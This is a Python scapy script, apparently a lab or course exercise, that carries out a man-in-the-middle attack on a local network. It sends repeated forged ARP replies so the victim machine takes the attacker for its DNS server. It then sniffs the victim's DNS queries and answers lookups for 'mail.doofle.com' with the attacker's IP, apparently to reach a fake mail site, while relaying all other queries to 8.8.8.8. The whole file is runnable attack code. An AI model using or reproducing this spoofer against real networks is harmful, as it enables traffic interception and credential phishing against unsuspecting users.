from typing import Dict, List
import multiprocessing as mp
from scapy.layers.l2 import getmacbyip, Ether, ARP
from scapy.layers.dns import DNS, DNSQR, DNSRR, IP, sr1, UDP
import scapy.all as scapy
import time

DOOFENSHMIRTZ_IP = "10.0.2.15"  # Enter the computer you attack's IP.
SECRATERY_IP = "10.0.2.4"  # Enter the attacker's IP.
NETWORK_DNS_SERVER_IP = "10.0.2.43"  # Enter the network's DNS server's IP.
SPOOF_SLEEP_TIME = 5

IFACE = ""  # lp03 it worked, it was the default interface

FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
    "mail.doofle.com": FAKE_GMAIL_IP

}


class ArpSpoofer(object):
    """
    An ARP Spoofing process. Sends periodical ARP responses to given target
    in order to convince it we are a specific ip (e.g: default gateway).
    """

    def __init__(self,
                 process_list: List[mp.Process],
                 target_ip: str, spoof_ip: str) -> None:
        """
        Initializer for the arp spoofer process.
        @param process_list global list of processes to append our process to.
        @param target_ip ip to spoof
        @param spoof_ip ip we want to convince the target we have.
        """
        process_list.append(self)
        self.process = None

        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.target_mac = None
        self.spoof_count = 0

    def get_target_mac(self) -> str:
        """
        Returns the mac address of the target.
        If not initialized yet, sends an ARP request to the target and waits for a response.
        @return the mac address of the target.
        """
        if self.target_mac:
            return self.target_mac

        self.target_mac = getmacbyip(self.target_ip)
        if self.target_mac:
            return self.target_mac


    def spoof(self) -> None:
        """
        Sends an ARP spoof that convinces target_ip that we are spoof_ip.
        Increases spoof count b y one.
        """        

        self.target_mac = self.get_target_mac()
        if not self.target_mac:
            # print("Failed to get MAC address")
            return

        arp_response = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.spoof_ip)    # op=2, for getting the response
        scapy.send(arp_response, verbose=False) # verbose false for not printing the information
        self.spoof_count += 1
        # print(f"{self.spoof_count} ARP to {self.target_ip}")


    def run(self) -> None:
        """
        Main loop of the process.
        """
        while True:
            self.spoof()
            time.sleep(SPOOF_SLEEP_TIME)

    def start(self) -> None:
        """
        Starts the ARP spoof process.
        """
        p = mp.Process(target=self.run)
        self.process = p
        self.process.start()


class DnsHandler(object):
    """
    A DNS request server process. Forwards some of the DNS requests to the
    default servers. However for specific domains this handler returns fake crafted
    DNS responses.
    """

    def __init__(self,
                 process_list: List[mp.Process],
                 spoof_dict: Dict[str, str]):
        """
        Initializer for the dns server process.
        @param process_list global list of processes to append our process to.
        @param spoof_dict dictionary of spoofs.
            The keys: represent the domains we wish to fake,
            The values: represent the fake responses we want
                        from the domains.
        """
        process_list.append(self)
        self.process = None

        self.spoof_dict = spoof_dict
        self.real_dns_server_ip = REAL_DNS_SERVER_IP

    def get_real_dns_response(self, pkt: scapy.packet.Packet) -> scapy.packet.Packet:
        """
        Returns the real DNS response to the given DNS request.
        Asks the default DNS servers (8.8.8.8) and forwards the response, only modifying
        the IP (change it to local IP).

        @param pkt DNS request from target.
        @return DNS response to pkt, source IP changed.
        """
        ip_layer = IP(dst=self.real_dns_server_ip)
        udp_layer = UDP(dport=53)
        dns_layer = pkt[DNS]

        dns_request = ip_layer / udp_layer / dns_layer

        response = scapy.sr1(dns_request, verbose=False)    # save the DNS request response
        response[IP].src = pkt[IP].dst  # put the original destination to the source IP
        return response


    def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
        """
        Returns a fake DNS response to the given DNS request.
        Crafts a DNS response leading to the ip address 'to' (parameter).

        @param pkt DNS request from target.
        @param to ip address to return from the DNS lookup.
        @return fake DNS response to the request.
        """
        dns_request = pkt[DNS]
        dns_response = DNS(
            id=dns_request.id,
            qr=1,
            aa=1,
            qd=dns_request.qd,
            an=DNSRR(
                rrname=dns_request.qd.qname,
                ttl=10,
                rdata=to
            )
        )
        response = IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport, sport=53) / dns_response

        return response



    def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
        """
        Main handler for DNS requests. Based on the spoof_dict, decides if the packet
        should be forwarded to real dns server or should be treated with a crafted response.
        Calls either get_real_dns_response or get_spoofed_dns_response accordingly.

        @param pkt DNS request from target.
        @return string describing the choice made
        """
        if DNS in pkt and pkt[DNS].qd:
            query_name = pkt[DNS].qd.qname.decode()

            for domain in self.spoof_dict:
                if domain in query_name:
                    response = self.get_spoofed_dns_response(pkt, self.spoof_dict[domain])
                    scapy.send(response, verbose=False)
                    return f"Spoofing: {query_name} with IP {self.spoof_dict[domain]}"

            response = self.get_real_dns_response(pkt)
            scapy.send(response, verbose=False)
            return f"{query_name} to the real DNS server"

        return "We didn't find DNS query"


    def run(self) -> None:
        """
        Main loop of the process. Sniffs for packets on the interface and sends DNS
        requests to resolve_packet. For every packet which passes the filter, self.resolve_packet
        is called and the return value is printed to the console.
        """
        while True:
            try:
                scapy.sniff(filter=DNS_FILTER, prn=self.resolve_packet)
            except:
                import traceback
                traceback.print_exc()

    def start(self) -> None:
        """
        Starts the DNS server process.
        """
        p = mp.Process(target=self.run)
        self.process = p
        self.process.start()


if __name__ == "__main__":
    plist = []
    spoofer = ArpSpoofer(plist, DOOFENSHMIRTZ_IP, NETWORK_DNS_SERVER_IP)
    server = DnsHandler(plist, SPOOF_DICT)

    print("Starting sub-processes...")
    server.start()
    spoofer.start()